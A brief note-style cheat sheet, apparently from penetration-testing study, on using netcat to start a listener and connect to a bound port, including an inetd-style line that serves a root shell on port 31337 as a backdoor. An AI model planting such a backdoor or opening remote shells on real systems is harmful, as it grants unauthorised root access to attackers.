Start listener
	`nc -lvnp <port>`

Bind to port
	`nc <ip_address> <port>`
	can be used if we have a payload that opens a backdoor
		example:
			`31337 stream tcp nowait root /bin/sh -i
			then we bind
			`nc <ip> 31337`